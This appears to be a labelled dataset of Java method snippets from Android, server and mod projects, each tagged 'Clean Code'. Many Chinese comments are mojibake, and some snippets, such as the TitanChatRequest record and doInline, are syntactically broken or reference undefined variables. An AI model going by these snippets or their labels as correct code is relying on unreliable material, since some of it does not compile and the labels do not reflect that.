    LettuceRedisUtils.pipeline(redisAsyncCommands -> {
      List<RedisFuture<?>> redisFutures=new ArrayList<>();
      String redisMessageKey=CharSequenceUtil.join(StrPool.COLON,AustinConstant.CACHE_KEY_PREFIX,AustinConstant.MESSAGE_ID,info.getMessageId());
      SimpleAnchorInfo messageAnchorInfo=SimpleAnchorInfo.builder().businessId(info.getBusinessId()).state(info.getState()).timestamp(info.getLogTimestamp()).build();
      redisFutures.add(redisAsyncCommands.lpush(redisMessageKey.getBytes(),JSON.toJSONString(messageAnchorInfo).getBytes()));
      redisFutures.add(redisAsyncCommands.expire(redisMessageKey.getBytes(),Duration.ofDays(3).toMillis() / 1000));
      SimpleAnchorInfo userAnchorInfo=SimpleAnchorInfo.builder().businessId(info.getBusinessId()).state(info.getState()).timestamp(info.getLogTimestamp()).build();
      for (      String id : info.getIds()) {
        redisFutures.add(redisAsyncCommands.lpush(id.getBytes(),JSON.toJSONString(userAnchorInfo).getBytes()));
        redisFutures.add(redisAsyncCommands.expire(id.getBytes(),(DateUtil.endOfDay(new Date()).getTime() - DateUtil.current()) / 1000));
      }
      redisFutures.add(redisAsyncCommands.hincrby(String.valueOf(info.getBusinessId()).getBytes(),String.valueOf(info.getState()).getBytes(),info.getIds().size()));
      redisFutures.add(redisAsyncCommands.expire(String.valueOf(info.getBusinessId()).getBytes(),((DateUtil.offsetDay(new Date(),30).getTime()) / 1000) - DateUtil.currentSeconds()));
      return redisFutures;
    }
);
  }
 catch (  Exception e) {
    log.error(""AustinSink#invoke error: {}"",Throwables.getStackTraceAsString(e));
  }
}",0,Clean Code
"public static boolean isConnected(Context context){
  ConnectivityManager cm=(ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
  if (cm == null)   return false;
  NetworkInfo ni=cm.getActiveNetworkInfo();
  if (ni != null && ni.isConnected())   return true;
  Network[] networks=cm.getAllNetworks();
  if (networks == null)   return false;
  for (  Network network : networks) {
    ni=cm.getNetworkInfo(network);
    if (ni != null && ni.getType() != ConnectivityManager.TYPE_VPN && ni.isConnected())     return true;
  }
  return false;
}
",0,Clean Code
"/** 
 * 閲嶅啓initContext锛涘浜巋ttp璇锋眰锛沚efore浜嬩欢閲岄潰
 * @param event 浜嬩欢
 */
@Override protected boolean sample(Event event){
  if (!MoonboxRepeatCache.isRepeatFlow(Tracer.getTraceId()) && entrance && event instanceof BeforeEvent) {
    BeforeEvent beforeEvent=(BeforeEvent)event;
    try {
      List<JavaRecordInterface> patterns=MoonboxContext.getInstance().getConfig().getJavaRecordInterfaces();
      String className=beforeEvent.javaClassName;
      String methodName=beforeEvent.javaMethodName;
      if (!matchRequestUriAndSample(patterns,className,methodName)) {
        ContextResourceClear.sampleFalse();
        return false;
      }
      return Tracer.getContext().inTimeSample(invokeType);
    }
 catch (    Exception e) {
      log.error(""error occurred when init dubbo invocation"",e);
      ContextResourceClear.sampleFalse();
      return false;
    }
  }
 else {
    return super.sample(event);
  }
}
",0,Clean Code
"public static boolean convertValueToBoolean(CharSequence value,boolean defaultValue){
  boolean result=false;
  if (null == value) {
    return defaultValue;
  }
  if (""1"".equals(value) || ""true"".equals(value) || ""TRUE"".equals(value)) {
    result=true;
  }
  return result;
}",0,Clean Code
"/** 
 * 鏃堕棿鎴宠浆鎹㈡垚鏃ユ湡鏍煎紡瀛楃涓�
 * @param seconds 绮剧‘鍒扮鐨勫瓧绗︿覆
 * @param format 鏍煎紡
 * @return
 */
public static String timeStamp2Date(String seconds,String format){
  if (seconds == null || seconds.isEmpty() || seconds.equals(""null"")) {
    return """";
  }
  if (format == null || format.isEmpty()) {
    format=""yyyy-MM-dd HH:mm:ss"";
  }
  SimpleDateFormat sdf=new SimpleDateFormat(format);
  return sdf.format(new Date(Long.valueOf(seconds + ""000"")));
}",0,Clean Code
"private void setShowVibrationIcon(){
  try {
    @SuppressWarnings(""unchecked"") List<String> mBlockedIcons=(List<String>)getObjectField(mCollapsedStatusBarFragment,""mBlockedIcons"");
    Object mStatusBarIconController=getObjectField(mCollapsedStatusBarFragment,""mStatusBarIconController"");
    Object mDarkIconManager=getObjectField(mCollapsedStatusBarFragment,""mDarkIconManager"");
    if (showVibrationIcon) {
      mBlockedIcons.remove(""volume"");
    }
 else {
      mBlockedIcons.add(""volume"");
    }
    callMethod(mDarkIconManager,""setBlockList"",mBlockedIcons);
    callMethod(mStatusBarIconController,""refreshIconGroups"");
  }
 catch (  Throwable ignored) {
  }
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)48);
    output.writeUInt32NoTag(equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)106);
    output.writeMessageNoTag(itemCostList);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.equipmentUniqueId,equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.itemCostList,itemCostList);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * 澧炲姞閰嶇疆锛涙暟鎹簱鍘熷瓙鎿嶄綔锛屾渶灏弒ql鍔ㄤ綔锛屾棤涓氬姟灏佽
 * @param configId   config id
 * @param configTags tags
 * @param dataId     dataId
 * @param group      group
 * @param tenant     tenant
 */
public void addConfiTagsRelationAtomic(long configId,String configTags,String dataId,String group,String tenant){
  if (StringUtils.isNotBlank(configTags)) {
    String[] tagArr=configTags.split("","");
    for (    String tag : tagArr) {
      addConfiTagRelationAtomic(configId,tag,dataId,group,tenant);
    }
  }
}
",0,Clean Code
"public static void omMessageHuya(String text,List<LiveRoomViewModel.DanmuInfo> resultList,MutableLiveData<Integer> danmuNum){
  try {
    JSONObject res=JSONObject.parseObject(text);
    if (""getMessageNotice"".equals(res.getString(""notice""))) {
      JSONObject data=JSONObject.parseObject(text).getJSONObject(""data"");
      String content=data.getString(""content"");
      Integer msgType=data.getInteger(""msgType"");
      String sendNick=data.getString(""sendNick"");
      Long senderLevel=data.getLong(""senderLevel"");
      if (msgType != 2 && (!isActive || !isBanned(content))) {
        resultList.add(new LiveRoomViewModel.DanmuInfo(sendNick,content));
        danmuNum.postValue(0);
      }
    }
  }
 catch (  Exception e) {
    System.out.println(""-------- 鏁版嵁澶勭悊寮傚父 --------"");
  }
}",0,Clean Code
"private void openProfile(boolean byAvatar){
  if (byAvatar) {
    TLRPC.Chat chat=getCurrentChat();
    if (chat != null && (chat.photo == null || chat.photo instanceof TLRPC.TL_chatPhotoEmpty)) {
      byAvatar=false;
    }
  }
  Bundle args=new Bundle();
  args.putLong(""chat_id"",chatId);
  ProfileActivity fragment=new ProfileActivity(args,avatarContainer.getSharedMediaPreloader());
  fragment.setChatInfo(chatFull);
  fragment.setPlayProfileAnimation(fragmentView.getMeasuredHeight() > fragmentView.getMeasuredWidth() && avatarContainer.getAvatarImageView().getImageReceiver().hasImageLoaded() && byAvatar ? 2 : 1);
  presentFragment(fragment);
}",0,Clean Code
"private void doInline(ClassNode classNode,FieldNode fieldNode,MethodNode methodNode){
  var indice=methodNode.maxLocals;
  methodNode.maxLocals+=Type.getType(fieldNode.desc).getSize();
  for (var iterator=methodNode.instructions.iterator(); iterator.hasNext(); ) {
    var node=iterator.next();
    if (node instanceof FieldInsnNode && fi.owner.equals(classNode.name) && fi.name.equals(fieldNode.name)&& fi.desc.equals(fieldNode.desc)) {
      if (Modifier.isStatic(fieldNode.access) && !Modifier.isStatic(methodNode.access)) {
        methodNode.instructions.insertBefore(node,new InsnNode(Opcodes.POP));
      }
      var opcode=(node.getOpcode() == Opcodes.GETFIELD || node.getOpcode() == Opcodes.GETSTATIC) ? Opcodes.ILOAD : Opcodes.ISTORE;
      iterator.set(new VarInsnNode(Type.getType(fieldNode.desc).getOpcode(opcode),indice));
    }
  }
  LOGGER.debug(""Inlined field "" + classNode.name + "" ""+ fieldNode.name+ "" ""+ fieldNode.desc);
}
",0,Clean Code
"/** 
 * 鏌ヨ鏂囦欢鍒楄〃
 * @param businessId id
 * @return file
 */
@Override public List<FileEntity> queryFileList(Integer businessId){
  List<FileEntity> fileEntityList=new ArrayList<>();
  CrmBusiness crmBusiness=getById(businessId);
  adminFileService.queryFileList(crmBusiness.getBatchId()).getData().forEach(fileEntity -> {
    fileEntity.setSource(""闄勪欢涓婁紶"");
    fileEntity.setReadOnly(0);
    fileEntityList.add(fileEntity);
  }
);
  List<CrmField> crmFields=crmFieldService.queryFileField();
  if (crmFields.size() > 0) {
    LambdaQueryWrapper<CrmBusinessData> wrapper=new LambdaQueryWrapper<>();
    wrapper.select(CrmBusinessData::getValue);
    wrapper.eq(CrmBusinessData::getBatchId,crmBusiness.getBatchId());
    wrapper.in(CrmBusinessData::getFieldId,crmFields.stream().map(CrmField::getFieldId).collect(Collectors.toList()));
    List<FileEntity> data=adminFileService.queryFileList(crmBusinessDataService.listObjs(wrapper,Object::toString)).getData();
    data.forEach(fileEntity -> {
      fileEntity.setSource(""鍟嗘満璇︽儏"");
      fileEntity.setReadOnly(1);
      fileEntityList.add(fileEntity);
    }
);
  }
  List<String> stringList=crmActivityService.queryFileBatchId(crmBusiness.getBusinessId(),getLabel().getType());
  if (stringList.size() > 0) {
    List<FileEntity> data=adminFileService.queryFileList(stringList).getData();
    data.forEach(fileEntity -> {
      fileEntity.setSource(""璺熻繘璁板綍"");
      fileEntity.setReadOnly(1);
      fileEntityList.add(fileEntity);
    }
);
  }
  return fileEntityList;
}",0,Clean Code
"public void detectStoryLanguage(TL_stories.StoryItem storyItem){
  if (storyItem == null || storyItem.detectedLng != null || storyItem.caption == null || storyItem.caption.length() == 0 || !LanguageDetector.hasSupport()) {
    return;
  }
  final StoryKey key=new StoryKey(storyItem);
  if (detectingStories.contains(key)) {
    return;
  }
  detectingStories.add(key);
  LanguageDetector.detectLanguage(storyItem.caption,lng -> AndroidUtilities.runOnUIThread(() -> {
    storyItem.detectedLng=lng;
    getMessagesController().getStoriesController().getStoriesStorage().putStoryInternal(storyItem.dialogId,storyItem);
    detectingStories.remove(key);
  }
),err -> AndroidUtilities.runOnUIThread(() -> {
    storyItem.detectedLng=UNKNOWN_LANGUAGE;
    getMessagesController().getStoriesController().getStoriesStorage().putStoryInternal(storyItem.dialogId,storyItem);
    detectingStories.remove(key);
  }
));
}",0,Clean Code
"private static String printTreeElement(Tree tree){
  if (tree instanceof J.CompilationUnit || tree instanceof J.ClassDeclaration || tree instanceof J.Block|| tree instanceof J.Empty|| tree instanceof J.Try|| tree instanceof J.Try.Catch|| tree instanceof J.ForLoop|| tree instanceof J.WhileLoop|| tree instanceof J.DoWhileLoop|| tree instanceof J.Lambda|| tree instanceof J.Lambda.Parameters|| tree instanceof J.If|| tree instanceof J.EnumValueSet|| tree instanceof J.TypeParameter) {
    return """";
  }
  if (tree instanceof J.Literal) {
    String s=((J.Literal)tree).getValueSource();
    return s != null ? s : """";
  }
  String[] lines=tree.toString().split(""\n"");
  StringBuilder output=new StringBuilder();
  for (int i=0; i < lines.length; i++) {
    output.append(lines[i].trim());
    if (i < lines.length - 1) {
      output.append("" "");
    }
  }
  return output.toString();
}",0,Clean Code
"public void correctGroupUsage(String group){
  groupCapacityPersistService.correctUsage(group,TimeUtils.getCurrentTime());
}
/** 
 * 淇Group瀹归噺淇℃伅涓殑浣跨敤鍊硷紙usage锛�
 */
private void correctGroupUsage(){
  long lastId=0;
  int pageSize=100;
  while (true) {
    List<GroupCapacity> groupCapacityList=groupCapacityPersistService.getCapacityList4CorrectUsage(lastId,pageSize);
    if (groupCapacityList.isEmpty()) {
      break;
    }
    lastId=groupCapacityList.get(groupCapacityList.size() - 1).getId();
    for (    GroupCapacity groupCapacity : groupCapacityList) {
      String group=groupCapacity.getGroup();
      groupCapacityPersistService.correctUsage(group,TimeUtils.getCurrentTime());
    }
    try {
      Thread.sleep(100);
    }
 catch (    InterruptedException e) {
    }
  }
}",0,Clean Code
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
  if (!fullHeight) {
    if (ev.getAction() == MotionEvent.ACTION_DOWN && ev.getY() < topOffset - dp(30)) {
      dismiss();
      return true;
    }
  }
 else {
    if (ev.getAction() == MotionEvent.ACTION_DOWN && scrollOffsetY != 0 && ev.getY() < scrollOffsetY - dp(30)) {
      dismiss();
      return true;
    }
  }
  return super.onInterceptTouchEvent(ev);
}
@Override public boolean onInterceptTouchEvent(MotionEvent e){
  if (getParent() != null && getParent().getParent() != null) {
    getParent().getParent().requestDisallowInterceptTouchEvent(canScrollHorizontally(-1) || canScrollHorizontally(1));
  }
  return super.onInterceptTouchEvent(e);
}",0,Clean Code
"private void readPrivateKey(){
  Stage window=new Stage();
  FileChooser fileChooser=new FileChooser();
  fileChooser.setTitle(""Open Private Key File"");
  AppServices.moveToActiveWindowScreen(window,800,450);
  File file=fileChooser.showOpenDialog(window);
  if (file != null) {
    if (file.length() > 1024) {
      AppServices.showErrorDialog(""Invalid private key file"",""This file does not contain a valid private key."");
      return;
    }
    try {
      key.setText(Files.asCharSource(file,StandardCharsets.UTF_8).read().trim());
    }
 catch (    IOException e) {
      AppServices.showErrorDialog(""Error reading private key file"",e.getMessage());
    }
  }
}",0,Clean Code
"/** 
 * 获取消息
 * @param userId            userId
 * @param conversationTypes 会话类型
 * @param lines             会话线路
 * @param contentTypes      消息类型
 * @param fromIndex         消息起始id(messageId)
 * @param before            true, 获取fromIndex之前的消息，即更旧的消息；false，获取fromIndex之后的消息，即更新的消息。都不包含fromIndex对应的消息
 * @param count             获取消息条数
 * @param callback          消息回调，当消息比较多，或者消息体比较大时，可能会回调多次
 */
public void getUserMessagesEx(String userId,List<Conversation.ConversationType> conversationTypes,List<Integer> lines,List<Integer> contentTypes,long fromIndex,boolean before,int count,GetMessageCallback callback){
  if (callback == null) {
    return;
  }
  if (!checkRemoteService()) {
    Log.e(TAG,""Remote service not available"");
    callback.onFail(ErrorCode.SERVICE_DIED);
    return;
  }
  if (conversationTypes == null || conversationTypes.size() == 0 || lines == null || lines.size() == 0 || contentTypes == null || contentTypes.size() == 0) {
    Log.e(TAG,""Invalid conversation type or lines or contentType"");
    callback.onFail(ErrorCode.INVALID_PARAMETER);
    return;
  }
  int[] intypes=new int[conversationTypes.size()];
  for (int i=0; i < conversationTypes.size(); i++) {
    intypes[i]=conversationTypes.get(i).ordinal();
  }
  try {
    mClient.getUserMessagesEx(userId,intypes,convertIntegers(lines),convertIntegers(contentTypes),fromIndex,before,count,new IGetMessageCallback.Stub(){
      @Override public void onSuccess(      List<Message> messages,      boolean hasMore) throws RemoteException {
        mainHandler.post(() -> callback.onSuccess(messages,hasMore));
      }
      @Override public void onFailure(      int errorCode) throws RemoteException {
        mainHandler.post(() -> callback.onFail(errorCode));
      }
    }
);
  }
 catch (  RemoteException e) {
    e.printStackTrace();
    mainHandler.post(() -> callback.onFail(ErrorCode.SERVICE_EXCEPTION));
  }
}",0,Clean Code
"public void addPendingStream(Video video){
  if (video == null || video.videoId == null || containsPendingStream(video)) {
    return;
  }
  mPendingStreams.add(video);
  persistState();
}
",0,Clean Code
"public static String emojiJudge(String text){
  if (TextUtils.isEmpty(text)) {
    return """";
  }
  if (getEmojiCount() == 0) {
    return text;
  }
  SpannableStringBuilder sb=new SpannableStringBuilder(text);
  String regex=""\\[(\\S+?)\\]"";
  Pattern p=Pattern.compile(regex);
  Matcher m=p.matcher(text);
  ArrayList<EmojiData> emojiDataArrayList=new ArrayList<>();
  int lastMentionIndex=-1;
  while (m.find()) {
    String emojiKey=m.group();
    int start;
    if (lastMentionIndex != -1) {
      start=text.indexOf(emojiKey,lastMentionIndex);
    }
 else {
      start=text.indexOf(emojiKey);
    }
    int end=start + emojiKey.length();
    lastMentionIndex=end;
    Emoji emoji=getEmojiMap().get(emojiKey);
    if (emoji == null) {
      continue;
    }
    EmojiData emojiData=new EmojiData();
    emojiData.setStart(start);
    emojiData.setEnd(end);
    emojiData.setEmojiText(emoji.getFaceName());
    emojiDataArrayList.add(emojiData);
  }
  if (emojiDataArrayList.isEmpty()) {
    return text;
  }
  for (int i=emojiDataArrayList.size() - 1; i >= 0; i--) {
    EmojiData emojiData=emojiDataArrayList.get(i);
    String emojiName=emojiData.getEmojiText();
    int start=emojiData.getStart();
    int end=emojiData.getEnd();
    if (!TextUtils.isEmpty(emojiName) && start != -1 && end != -1) {
      sb.replace(start,end,emojiName);
    }
  }
  return sb.toString();
}",0,Clean Code
"@Override public void addTargets(Object transitionObj,ArrayList<View> views){
  Transition transition=(Transition)transitionObj;
  if (transition == null) {
    return;
  }
  if (transition instanceof TransitionSet) {
    TransitionSet set=(TransitionSet)transition;
    int numTransitions=set.getTransitionCount();
    for (int i=0; i < numTransitions; i++) {
      Transition child=set.getTransitionAt(i);
      addTargets(child,views);
    }
  }
 else   if (!hasSimpleTarget(transition)) {
    List<View> targets=transition.getTargets();
    if (isNullOrEmpty(targets)) {
      int numViews=views.size();
      for (int i=0; i < numViews; i++) {
        transition.addTarget(views.get(i));
      }
    }
  }
}",0,Clean Code
"/** 
 * TitanChatRequest encapsulates the request parameters for the Titan chat model.
 * @param inputText The prompt to use for the chat.
 * @param textGenerationConfig The text generation configuration.
 */
@JsonInclude(Include.NON_NULL) public record TitanChatRequest(@JsonProperty(""inputText"") String inputText,@JsonProperty(""textGenerationConfig"") TextGenerationConfig textGenerationConfig){
  @JsonInclude(Include.NON_NULL) public record TextGenerationConfig;
  @JsonProperty(""temperature"") Float temperature;
  @JsonProperty(""topP"") Float topP;
  @JsonProperty(""maxTokenCount"") Integer maxTokenCount;
  @JsonProperty(""stopSequences"") List<String> stopSequences;
  public static Builder builder;
  String inputText;
{
    return new Builder(inputText);
  }
public static class Builder {
    private final String inputText;
    private Float temperature;
    private Float topP;
    private Integer maxTokenCount;
    private List<String> stopSequences;
    public Builder(    String inputText){
      this.inputText=inputText;
    }
    public Builder withTemperature(    Float temperature){
      this.temperature=temperature;
      return this;
    }
    public Builder withTopP(    Float topP){
      this.topP=topP;
      return this;
    }
    public Builder withMaxTokenCount(    Integer maxTokenCount){
      this.maxTokenCount=maxTokenCount;
      return this;
    }
    public Builder withStopSequences(    List<String> stopSequences){
      this.stopSequences=stopSequences;
      return this;
    }
    public TitanChatRequest build(){
      if (this.temperature == null && this.topP == null && this.maxTokenCount == null && this.stopSequences == null) {
        return new TitanChatRequest(this.inputText,null);
      }
 else {
        return new TitanChatRequest(this.inputText,new TextGenerationConfig(this.temperature,this.topP,this.maxTokenCount,this.stopSequences));
      }
    }
  }
}
",0,Clean Code
"public static int getHeightByWidth(int width){
  int originHeight=-1;
  if (width < 280) {
    originHeight=144;
  }
 else   if (width < 440) {
    originHeight=240;
  }
 else   if (width < 650) {
    originHeight=360;
  }
 else   if (width < 870) {
    originHeight=480;
  }
 else   if (width < 1300) {
    originHeight=720;
  }
 else   if (width < 2000) {
    originHeight=1080;
  }
 else   if (width < 2600) {
    originHeight=1440;
  }
 else   if (width < 3900) {
    originHeight=2160;
  }
 else   if (width < 7700) {
    originHeight=4320;
  }
  return originHeight;
}",0,Clean Code
"/** 
 * 澶勭悊淇濆瓨鐨勫紑濮嬬粨鏉熸椂闂�
 * @param oaEvent 鏃ョ▼瀵硅薄
 * @return
 */
@Override public OaEvent processTime(OaEvent oaEvent){
  Date startTime=oaEvent.getStartTime();
  Integer repeatRate=oaEvent.getRepeatRate();
  Integer endType=oaEvent.getEndType();
  String endTypeConfig=oaEvent.getEndTypeConfig();
  Date repeatEndTime=null;
  if (endType == 2) {
    Integer count=Integer.valueOf(endTypeConfig);
    int offset=repeatRate * count;
    repeatEndTime=processCountTime(startTime,offset);
  }
 else   if (endType == 3) {
    repeatEndTime=DateUtil.parseDateTime(endTypeConfig);
  }
  oaEvent.setRepeatStartTime(startTime);
  oaEvent.setRepeatEndTime(repeatEndTime);
  return oaEvent;
}",0,Clean Code
"/** 
 * Attaches any value to an object instance. This simulates adding an instance field. The value can be retrieved again with  {@link #getAdditionalInstanceField}.
 * @param obj   The object instance for which the value should be stored.
 * @param key   The key in the value map for this object instance.
 * @param value The value to store.
 * @return The previously stored value for this instance/key combination, or {@code null} if there was none.
 */
public static Object setAdditionalInstanceField(Object obj,String key,Object value){
  if (obj == null)   throw new NullPointerException(""object must not be null"");
  if (key == null)   throw new NullPointerException(""key must not be null"");
  HashMap<String,Object> objectFields;
synchronized (additionalFields) {
    objectFields=additionalFields.get(obj);
    if (objectFields == null) {
      objectFields=new HashMap<>();
      additionalFields.put(obj,objectFields);
    }
  }
synchronized (objectFields) {
    return objectFields.put(key,value);
  }
}
",0,Clean Code
"private static Optional<String> sparkNodeName(OpenLineageContext context){
  if (context.getQueryExecution() == null || !context.getQueryExecution().isPresent() || context.getQueryExecution().get().executedPlan() == null) {
    return Optional.empty();
  }
  SparkPlan node=context.getQueryExecution().get().executedPlan();
  if (node instanceof WholeStageCodegenExec) {
    node=((WholeStageCodegenExec)node).child();
  }
  return Optional.ofNullable(node).map(SparkPlan::nodeName).map(JobNameBuilder::normalizeName);
}
",0,Clean Code
"@SuppressLint(""RestrictedApi"") @Override public boolean dispatchKeyEvent(KeyEvent event){
  final int keyCode=event.getKeyCode();
  final ActionBar actionBar=getSupportActionBar();
  if (keyCode == KeyEvent.KEYCODE_MENU && actionBar != null && actionBar.onMenuKeyEvent(event)) {
    return true;
  }
  return super.dispatchKeyEvent(event);
}
",0,Clean Code
"private boolean isSurrounded(PlayerEntity target){
  for (  Direction dir : Direction.values()) {
    if (dir == Direction.UP || dir == Direction.DOWN)     continue;
    testPos.set(target.getBlockPos().offset(dir));
    Block block=mc.world.getBlockState(testPos).getBlock();
    if (block != Blocks.OBSIDIAN && block != Blocks.BEDROCK && block != Blocks.RESPAWN_ANCHOR && block != Blocks.CRYING_OBSIDIAN && block != Blocks.NETHERITE_BLOCK)     return false;
  }
  return true;
}
",0,Clean Code
"public void run(){
  do {
    try {
      Thread.sleep(SCAN_LOOP_WAIT_MILLIS);
    }
 catch (    InterruptedException e) {
    }
    if (Thread.interrupted()) {
      LOG.debug(""Refresher has been interrupted"");
      return;
    }
    if (!this.open.get()) {
      LOG.debug(""Cancelling refresher"");
      return;
    }
    this.updateFrameBuffer();
  }
 while (this.open.get());
}
",0,Clean Code
"/** 
 * 娓叉煋 Dockerfile 鏂囦欢
 * @param logContent 鏃ュ織 StringBuilder
 * @param request    闀滃儚鏋勫缓璇锋眰
 * @param cloneDir   鐩爣瀛樺偍鐩綍
 */
private Path renderDockerfile(StringBuilder logContent,ImageBuilderCreateReq request,Path cloneDir) throws IOException {
  Jinjava jinjava=new Jinjava();
  Path dockerfileTemplate;
  String dockerfileTemplateStr=request.getDockerfileTemplate();
  if (StringUtils.isEmpty(dockerfileTemplateStr)) {
    dockerfileTemplateStr=""Dockerfile"";
  }
  if (StringUtils.isEmpty(request.getRepoPath())) {
    dockerfileTemplate=Paths.get(cloneDir.toString(),dockerfileTemplateStr);
  }
 else {
    dockerfileTemplate=Paths.get(cloneDir.toString(),request.getRepoPath(),dockerfileTemplateStr);
  }
  String template=FileUtils.readFileToString(dockerfileTemplate.toFile(),StandardCharsets.UTF_8);
  String renderedTemplate=jinjava.render(template,request.getDockerfileTemplateArgs());
  String dockerfilePath=request.getDockerfileTemplate() + "".__rendered__"";
  Path dockerfile;
  if (StringUtils.isEmpty(request.getRepoPath())) {
    dockerfile=Paths.get(cloneDir.toString(),dockerfilePath);
  }
 else {
    dockerfile=Paths.get(cloneDir.toString(),request.getRepoPath(),dockerfilePath);
  }
  FileUtils.writeStringToFile(dockerfile.toFile(),renderedTemplate,StandardCharsets.UTF_8);
  logContent.append(String.format(""dockerfile has rendered:\n%s"",renderedTemplate));
  return dockerfile;
}",0,Clean Code
"@EventHandler public void onServerConnect(ServerConnectEvent event){
  if (usingServerCommand.remove(event.getPlayer())) {
    return;
  }
  if (balanceNodes && isMultiPaperServer(event.getTarget().getName())) {
    List<ServerInfo> servers=new ArrayList<>(getProxy().getServers().values());
    Collections.shuffle(servers);
    ServerInfo bestServer=null;
    long lowestTickTime=Long.MAX_VALUE;
    for (    ServerInfo info : servers) {
      ServerConnection connection=ServerConnection.getConnection(info.getName());
      if (connection != null && ServerConnection.isAlive(info.getName()) && connection.getTimer().averageInMillis() < lowestTickTime) {
        lowestTickTime=connection.getTimer().averageInMillis();
        bestServer=info;
      }
    }
    if (bestServer != null) {
      event.setTarget(bestServer);
    }
  }
}
",0,Clean Code
"/** 
 * Circular reveal enter animation
 */
@RequiresApi(api=Build.VERSION_CODES.LOLLIPOP) private void doCircularEnterAnimation(){
  getViewTreeObserver().addOnPreDrawListener(new ViewTreeObserver.OnPreDrawListener(){
    @Override public boolean onPreDraw(){
      getViewTreeObserver().removeOnPreDrawListener(this);
      final int revealRadius=(int)Math.hypot(getWidth(),getHeight());
      int startRadius=0;
      if (mView != null) {
        startRadius=mView.getWidth() / 2;
      }
 else       if (mFocusCircleRadius > 0 || mFocusRectangleWidth > 0 || mFocusRectangleHeight > 0) {
        mCenterX=mFocusPositionX;
        mCenterY=mFocusPositionY;
      }
      Animator enterAnimator=ViewAnimationUtils.createCircularReveal(GuideCaseView.this,mCenterX,mCenterY,startRadius,revealRadius);
      enterAnimator.setDuration(mAnimationDuration);
      enterAnimator.setInterpolator(AnimationUtils.loadInterpolator(mActivity,android.R.interpolator.accelerate_cubic));
      enterAnimator.start();
      return false;
    }
  }
);
}",0,Clean Code
"/** 
 * @api {delete} /apps/:appId/helm/:id 鍒犻櫎HELM缁勪欢
 * @apiName DeleteApplicationHelmMeta
 * @apiGroup 搴旂敤鍏宠仈HELM缁勪欢 API
 * @apiParam (Path Parameters) {String} appId 搴旂敤 ID
 * @apiParam (Path Parameters) {Number} id HELM缁勪欢涓婚敭 ID
 */
@DeleteMapping(value=""/{id}"") public TeslaBaseResult delete(@PathVariable String appId,@PathVariable Long id,@RequestHeader(value=""X-Biz-App"",required=false) String headerBizApp){
  if (Objects.isNull(id)) {
    return buildSucceedResult(Boolean.TRUE);
  }
  BizAppContainer container=BizAppContainer.valueOf(headerBizApp);
  String namespaceId=container.getNamespaceId();
  String stageId=container.getStageId();
  return buildSucceedResult(metaProvider.delete(id,namespaceId,stageId));
}
",0,Clean Code
"/** 
 * Initializes the index for the given cache UID.
 * @param uid The cache UID.
 * @throws DatabaseIOException If an error occurs initializing the index.
 */
public void initialize(long uid) throws DatabaseIOException {
  try {
    String hexUid=Long.toHexString(uid);
    tableName=getTableName(hexUid);
    SQLiteDatabase readableDatabase=databaseProvider.getReadableDatabase();
    int version=VersionTable.getVersion(readableDatabase,VersionTable.FEATURE_CACHE_FILE_METADATA,hexUid);
    if (version != TABLE_VERSION) {
      SQLiteDatabase writableDatabase=databaseProvider.getWritableDatabase();
      writableDatabase.beginTransaction();
      try {
        VersionTable.setVersion(writableDatabase,VersionTable.FEATURE_CACHE_FILE_METADATA,hexUid,TABLE_VERSION);
        dropTable(writableDatabase,tableName);
        writableDatabase.execSQL(""CREATE TABLE "" + tableName + "" ""+ TABLE_SCHEMA);
        writableDatabase.setTransactionSuccessful();
      }
  finally {
        writableDatabase.endTransaction();
      }
    }
  }
 catch (  SQLException e) {
    throw new DatabaseIOException(e);
  }
}
",0,Clean Code
"/** 
 * Determine the rotation necessary to activate this transaction. <p> The position between the intended click position and the player can be determined with two triangles. First, we compute the difference of the X and Z coordinates: <p> Player position (0, 0) | | | |_____________ Intended target (-3, 2) <p> We then use the Pythagorean Theorem to find the direct line (hypotenuse) on the XZ plane. Finding the angle of the triangle from there, closest to the player, gives us our yaw rotation value Then doing the same using the new XZ distance and Y difference, we can find the direct line of sight from the player to the intended target, and the pitch rotation value. We can then send the necessary packets to update the player's rotation.
 * @param session the Geyser Session
 * @param target the position to look at
 */
private void lookAt(GeyserSession session,Vector3f target){
  Vector3d playerPosition=session.getCollisionManager().getPlayerBoundingBox().getBottomCenter();
  float xDiff=(float)(target.getX() - playerPosition.getX());
  float yDiff=(float)(target.getY() - (playerPosition.getY() + session.getEyeHeight()));
  float zDiff=(float)(target.getZ() - playerPosition.getZ());
  float yaw=(float)-Math.toDegrees(Math.atan2(xDiff,zDiff));
  double xzHypot=Math.sqrt(xDiff * xDiff + zDiff * zDiff);
  float pitch=(float)-Math.toDegrees(Math.atan2(yDiff,xzHypot));
  SessionPlayerEntity entity=session.getPlayerEntity();
  ServerboundMovePlayerPosRotPacket returnPacket=new ServerboundMovePlayerPosRotPacket(entity.isOnGround(),session.getInputCache().lastHorizontalCollision(),playerPosition.getX(),playerPosition.getY(),playerPosition.getZ(),entity.getYaw(),entity.getPitch());
  ServerboundMovePlayerPosRotPacket movementPacket=new ServerboundMovePlayerPosRotPacket(entity.isOnGround(),session.getInputCache().lastHorizontalCollision(),playerPosition.getX(),playerPosition.getY(),playerPosition.getZ(),yaw,pitch);
  session.sendDownstreamGamePacket(movementPacket);
  if (session.getLookBackScheduledFuture() != null) {
    session.getLookBackScheduledFuture().cancel(false);
  }
  if (Math.abs(entity.getYaw() - yaw) > 1f || Math.abs(entity.getPitch() - pitch) > 1f) {
    session.setLookBackScheduledFuture(session.scheduleInEventLoop(() -> {
      Vector3d newPlayerPosition=session.getCollisionManager().getPlayerBoundingBox().getBottomCenter();
      if (!newPlayerPosition.equals(playerPosition) || entity.getYaw() != returnPacket.getYaw() || entity.getPitch() != returnPacket.getPitch()) {
        return;
      }
      session.sendDownstreamGamePacket(returnPacket);
    }
,150,TimeUnit.MILLISECONDS));
  }
}",0,Clean Code
"public TextureViewWrapper(Context context,ViewGroup root){
  mVideoSurface=(TextureView)LayoutInflater.from(context).inflate(R.layout.lb_video_texture,root,false);
